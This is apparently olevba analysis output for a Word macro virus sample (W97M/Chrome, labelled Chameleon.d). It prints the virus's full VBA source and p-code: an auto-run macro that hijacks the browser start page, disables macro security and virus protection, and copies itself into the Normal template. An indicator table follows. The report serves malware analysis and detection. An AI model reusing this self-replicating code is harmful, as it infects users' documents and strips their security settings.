olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Chameleon.d
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Chameleon.d - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Private Sub Document_Open()
    On Error Resume Next
    If System.PrivateProfileString("", "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion", "MVP") <> "Enabled by Total Konfuzion" Then
        Randomize
        System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Microsoft\Internet Explorer\Main", "Start Page") = "http://codemonkey.cjb.net"
        If System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Microsoft\Office\9.0\Security", "Level") <> "" Then
            CommandBars("Macro").Controls("Security...").Enabled = (Rnd * 0)
        Else
            CommandBars("Tools").Controls("Macro").Enabled = (Rnd * 0)
            CommandBars("Tools").Controls("Templates and Add-ins...").Enabled = (Rnd * 0)
            CommandBars("Format").Controls("Style Gallery...").Enabled = (Rnd * 0)
        End If
        With Options
            .VirusProtection = (Rnd * 0)
            .SaveNormalPrompt = (Rnd * 0)
            .ConfirmConversions = (Rnd * 0)
        End With
        With Application
            .EnableCancelKey = wdCancelDisabled
            .UserName = "Total Konfuzion"
            .UserInitials = "TK"
            .UserAddress = "W97M/Chrome"
        End With
        If ThisDocument = ActiveDocument Then Set i = NormalTemplate Else Set i = ActiveDocument
        Vx = ThisDocument.VBProject.VBComponents.Item(1).CodeModule.Lines(1, ThisDocument.VBProject.VBComponents.Item(1).CodeModule.CountOfLines)
        Set d = i.VBProject.VBComponents.Item(1).CodeModule
        d.DeleteLines 1, d.CountOfLines
        d.AddFromString Vx
        Chrome = "The day of the Chrome is comming...   >8)      "
        If Day(Now) <> "15" Then
            StatusBar = Chrome
            Application.Caption = Chrome
        End If
        If Day(Now) = "15" Then
            Application.Caption = Chrome
            With ActiveDocument.Shapes.AddShape(msoShapeSmileyFace, 220, 150, 150, 140).Fill
                .ForeColor.RGB = RGB(90, 90, 100)
                .BackColor.RGB = RGB(190, 211, 230)
                .TwoColorGradient msoGradientHorizontal, 1
            End With
        End If
        ActiveDocument.SaveAs FileName:=ActiveDocument.FullName, FileFormat:=wdFormatDocument
    End If
End Sub
Sub HelpAbout()
    MsgBox "W97M/Chrome" + vbCr + vbCr + "  -Total Konfuzion-", vbSystemModal, ">8)"
End Sub
Private Sub AutoClose()
    If Day(Now) = Minute(Now) Then MsgBox "The day of the Chrome is comming...   >8)", vbCritical + vbSystemModal, "W97M/Chrome"
End Sub

-------------------------------------------------------------------------------
VBA MACRO VBA_P-code.txt 
in file: VBA P-code - OLE stream: 'VBA P-code'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
' Processing file: Virus.MSWord.Chameleon.d
' ===============================================================================
' Module streams:
' Macros/VBA/ThisDocument - 10193 bytes
' Line #0:
' 	FuncDefn (Private Sub Document_Open())
' Line #1:
' 	OnError (Resume Next) 
' Line #2:
' 	LitStr 0x0000 ""
' 	LitStr 0x003C "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion"
' 	LitStr 0x0003 "MVP"
' 	Ld System 
' 	ArgsMemLd PrivateProfileString 0x0003 
' 	LitStr 0x001A "Enabled by Total Konfuzion"
' 	Ne 
' 	IfBlock 
' Line #3:
' 	ArgsCall Read 0x0000 
' Line #4:
' 	LitStr 0x0019 "http://codemonkey.cjb.net"
' 	LitStr 0x0000 ""
' 	LitStr 0x003B "HKEY_CURRENT_USER\Software\Microsoft\Internet Explorer\Main"
' 	LitStr 0x000A "Start Page"
' 	Ld System 
' 	ArgsMemSt PrivateProfileString 0x0003 
' Line #5:
' 	LitStr 0x0000 ""
' 	LitStr 0x0038 "HKEY_CURRENT_USER\Software\Microsoft\Office\9.0\Security"
' 	LitStr 0x0005 "Level"
' 	Ld System 
' 	ArgsMemLd PrivateProfileString 0x0003 
' 	LitStr 0x0000 ""
' 	Ne 
' 	IfBlock 
' Line #6:
' 	Ld Rnd 
' 	LitDI2 0x0000 
' 	Mul 
' 	Paren 
' 	LitStr 0x000B "Security..."
' 	LitStr 0x0005 "Macro"
' 	ArgsLd CommandBars 0x0001 
' 	ArgsMemLd Controls 0x0001 
' 	MemSt Enabled 
' Line #7:
' 	ElseBlock 
' Line #8:
' 	Ld Rnd 
' 	LitDI2 0x0000 
' 	Mul 
' 	Paren 
' 	LitStr 0x0005 "Macro"
' 	LitStr 0x0005 "Tools"
' 	ArgsLd CommandBars 0x0001 
' 	ArgsMemLd Controls 0x0001 
' 	MemSt Enabled 
' Line #9:
' 	Ld Rnd 
' 	LitDI2 0x0000 
' 	Mul 
' 	Paren 
' 	LitStr 0x0018 "Templates and Add-ins..."
' 	LitStr 0x0005 "Tools"
' 	ArgsLd CommandBars 0x0001 
' 	ArgsMemLd Controls 0x0001 
' 	MemSt Enabled 
' Line #10:
' 	Ld Rnd 
' 	LitDI2 0x0000 
' 	Mul 
' 	Paren 
' 	LitStr 0x0010 "Style Gallery..."
' 	LitStr 0x0006 "Format"
' 	ArgsLd CommandBars 0x0001 
' 	ArgsMemLd Controls 0x0001 
' 	MemSt Enabled 
' Line #11:
' 	EndIfBlock 
' Line #12:
' 	StartWithExpr 
' 	Ld Options 
' 	With 
' Line #13:
' 	Ld Rnd 
' 	LitDI2 0x0000 
' 	Mul 
' 	Paren 
' 	MemStWith VirusProtection 
' Line #14:
' 	Ld Rnd 
' 	LitDI2 0x0000 
' 	Mul 
' 	Paren 
' 	MemStWith SaveNormalPrompt 
' Line #15:
' 	Ld Rnd 
' 	LitDI2 0x0000 
' 	Mul 
' 	Paren 
' 	MemStWith ConfirmConversions 
' Line #16:
' 	EndWith 
' Line #17:
' 	StartWithExpr 
' 	Ld Application 
' 	With 
' Line #18:
' 	Ld wdCancelDisabled 
' 	MemStWith EnableCancelKey 
' Line #19:
' 	LitStr 0x000F "Total Konfuzion"
' 	MemStWith UserName 
' Line #20:
' 	LitStr 0x0002 "TK"
' 	MemStWith UserInitials 
' Line #21:
' 	LitStr 0x000B "W97M/Chrome"
' 	MemStWith UserAddress 
' Line #22:
' 	EndWith 
' Line #23:
' 	Ld ThisDocument 
' 	Ld ActiveDocument 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	SetStmt 
' 	Ld NormalTemplate 
' 	Set i 
' 	Else 
' 	BoSImplicit 
' 	SetStmt 
' 	Ld ActiveDocument 
' 	Set i 
' 	EndIf 
' Line #24:
' 	LitDI2 0x0001 
' 	LitDI2 0x0001 
' 	Ld ThisDocument 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd CodeModule 
' 	MemLd CountOfLines 
' 	LitDI2 0x0001 
' 	Ld ThisDocument 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemLd Lines 0x0002 
' 	St Vx 
' Line #25:
' 	SetStmt 
' 	LitDI2 0x0001 
' 	Ld i 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd CodeModule 
' 	Set d 
' Line #26:
' 	LitDI2 0x0001 
' 	Ld d 
' 	MemLd CountOfLines 
' 	Ld d 
' 	ArgsMemCall DeleteLines 0x0002 
' Line #27:
' 	Ld Vx 
' 	Ld d 
' 	ArgsMemCall AddFromString 0x0001 
' Line #28:
' 	LitStr 0x002F "The day of the Chrome is comming...   >8)      "
' 	St Chrome 
' Line #29:
' 	Ld Now 
' 	ArgsLd Day 0x0001 
' 	LitStr 0x0002 "15"
' 	Ne 
' 	IfBlock 
' Line #30:
' 	Ld Chrome 
' 	St StatusBar 
' Line #31:
' 	Ld Chrome 
' 	Ld Application 
' 	MemSt Caption 
' Line #32:
' 	EndIfBlock 
' Line #33:
' 	Ld Now 
' 	ArgsLd Day 0x0001 
' 	LitStr 0x0002 "15"
' 	Eq 
' 	IfBlock 
' Line #34:
' 	Ld Chrome 
' 	Ld Application 
' 	MemSt Caption 
' Line #35:
' 	StartWithExpr 
' 	Ld msoShapeSmileyFace 
' 	LitDI2 0x00DC 
' 	LitDI2 0x0096 
' 	LitDI2 0x0096 
' 	LitDI2 0x008C 
' 	Ld ActiveDocument 
' 	MemLd Shapes 
' 	ArgsMemLd AddShape 0x0005 
' 	MemLd Fill 
' 	With 
' Line #36:
' 	LitDI2 0x005A 
' 	LitDI2 0x005A 
' 	LitDI2 0x0064 
' 	ArgsLd RSet 0x0003 
' 	MemLdWith ForeColor 
' 	MemSt RSet 
' Line #37:
' 	LitDI2 0x00BE 
' 	LitDI2 0x00D3 
' 	LitDI2 0x00E6 
' 	ArgsLd RSet 0x0003 
' 	MemLdWith BackColor 
' 	MemSt RSet 
' Line #38:
' 	Ld msoGradientHorizontal 
' 	LitDI2 0x0001 
' 	ArgsMemCallWith TwoColorGradient 0x0002 
' Line #39:
' 	EndWith 
' Line #40:
' 	EndIfBlock 
' Line #41:
' 	Ld ActiveDocument 
' 	MemLd FullName 
' 	ParamNamed FileName 
' 	Ld wdFormatDocument 
' 	ParamNamed FileFormat 
' 	Ld ActiveDocument 
' 	ArgsMemCall SaveAs 0x0002 
' Line #42:
' 	EndIfBlock 
' Line #43:
' 	EndSub 
' Line #44:
' 	FuncDefn (Sub HelpAbout())
' Line #45:
' 	LitStr 0x000B "W97M/Chrome"
' 	Ld vbCr 
' 	Add 
' 	Ld vbCr 
' 	Add 
' 	LitStr 0x0013 "  -Total Konfuzion-"
' 	Add 
' 	Ld vbSystemModal 
' 	LitStr 0x0003 ">8)"
' 	ArgsCall MsgBox 0x0003 
' Line #46:
' 	EndSub 
' Line #47:
' 	FuncDefn (Private Sub AutoClose())
' Line #48:
' 	Ld Now 
' 	ArgsLd Day 0x0001 
' 	Ld Now 
' 	ArgsLd Minute 0x0001 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x0029 "The day of the Chrome is comming...   >8)"
' 	Ld vbCritical 
' 	Ld vbSystemModal 
' 	Add 
' 	LitStr 0x000B "W97M/Chrome"
' 	ArgsCall MsgBox 0x0003 
' 	EndIf 
' Line #49:
' 	EndSub 
' Line #50:
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoClose           |Runs when the Word document is closed        |
|AutoExec  |Document_Open       |Runs when the Word or Publisher document is  |
|          |                    |opened                                       |
|Suspicious|Windows             |May enumerate application windows (if        |
|          |                    |combined with Shell.Application object)      |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|AddFromString       |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|System              |May run an executable file or a system       |
|          |                    |command on a Mac (if combined with           |
|          |                    |libc.dylib)                                  |
|IOC       |http://codemonkey.cj|URL                                          |
|          |b.net               |                                             |
|Suspicious|VBA Stomping        |VBA Stomping was detected: the VBA source    |
|          |                    |code and P-code are different, this may have |
|          |                    |been used to hide malicious code             |
+----------+--------------------+---------------------------------------------+
VBA Stomping detection is experimental: please report any false positive/negative at https://github.com/decalage2/oletools/issues

